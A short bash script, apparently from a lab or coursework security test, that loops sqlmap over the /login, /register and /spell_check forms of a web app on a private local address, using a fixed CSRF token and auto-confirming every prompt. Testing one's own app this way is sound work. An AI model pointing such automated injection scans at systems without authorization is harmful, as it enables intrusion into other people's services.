#!/bin/bash

sqlmap="/usr/bin/python /home/marcus/sqlmap-dev/sqlmap.py --answers='csrf=y'"
target=" -u 'http://192.168.56.102:5000"

payloads=()
payloads[0]="/login' --data='uname=lol&pword=asdf&2fa=1111&csrf=90c1fa8c265ca59cd2c25c5edb7e7d583a7a6d0d35c059ff089926086abb49d5'"
payloads[1]="/register' --data='uname=hello&pword=world&2fa=11919&csrf=90c1fa8c265ca59cd2c25c5edb7e7d583a7a6d0d35c059ff089926086abb49d5'"
payloads[2]="/spell_check' --data='inputtext=test+foo+bar+asdf+test&csrf=90c1fa8c265ca59cd2c25c5edb7e7d583a7a6d0d35c059ff089926086abb49d5'"

i=0
for payload in "${payloads[@]}"
do
    cmd=$sqlmap$target$payload
    sec="\""
    cmd=${cmd//\'/$sec}
    yes | eval $cmd
done